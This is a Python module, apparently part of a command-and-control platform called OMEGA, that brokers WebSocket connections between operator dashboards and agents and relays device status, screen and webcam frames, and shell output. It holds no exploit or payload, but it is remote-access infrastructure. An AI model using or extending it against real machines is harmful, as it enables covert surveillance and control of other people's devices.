"""
OMEGA Broker — WebSocket Connection Manager
Manages portals (dashboards) and clients (agents) in a single shared state.
Imported by omega_server.py at startup.
"""
import asyncio, orjson
from typing import Dict, Set
from fastapi import WebSocket

# Shared state — module-level so omega_server.py can import them directly
PORTALS: Set[WebSocket] = set()
CLIENTS: Dict[str, WebSocket] = {}
PORTAL_TO_CLIENT: Dict[WebSocket, str] = {}


class ConnectionManager:
    """Real-time message broker for the OMEGA C2 platform."""

    # ── Connection Lifecycle ──────────────────────────────────────────────────
    async def connect(self, websocket: WebSocket, client_type: str, client_id: str = None):
        if client_type == "portal":
            PORTALS.add(websocket)
        else:
            if client_id:
                CLIENTS[client_id] = websocket

    def disconnect(self, websocket: WebSocket, db=None):
        PORTALS.discard(websocket)
        PORTAL_TO_CLIENT.pop(websocket, None)
        for cid, ws in list(CLIENTS.items()):
            if ws == websocket:
                CLIENTS.pop(cid)
                asyncio.ensure_future(self.broadcast_devices(db))
                break

    # ── Broadcast Helpers ────────────────────────────────────────────────────
    async def broadcast_devices(self, db=None):
        """Push full device list to all portals with real-time Active/Standby status."""
        # Lazy-import db to avoid circular imports
        if db is None:
            import sys, os
            sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
            from core.database import Database
            db = Database()

        try:
            devices = db.get_devices()
            active = list(CLIENTS.keys())
            for dev in devices:
                # v21.2 Fix: Use explicit ID instead of volatile hostname for status match
                dev["status"] = "Active" if dev.get("id") in active else "Standby"
            payload = orjson.dumps({"t": "devices", "data": devices}).decode()
        except Exception as e:
            print(f"[Broker] broadcast_devices error: {e}")
            payload = orjson.dumps({"t": "devices", "data": []}).decode()

        for portal in list(PORTALS):
            try:
                await portal.send_text(payload)
            except:
                PORTALS.discard(portal)
                PORTAL_TO_CLIENT.pop(portal, None)

    async def broadcast_to_portals(self, data: bytes, exclude_id: str = None):
        """Low-latency binary broadcast (screen/webcam frames)."""
        for portal in list(PORTALS):
            try:
                await portal.send_bytes(data)
            except:
                PORTALS.discard(portal)

    async def broadcast_text_to_portals(self, text: str, exclude_id: str = None):
        """Text-based broadcast (shell output, logs, telemetry)."""
        for portal in list(PORTALS):
            try:
                await portal.send_text(text)
            except:
                PORTALS.discard(portal)
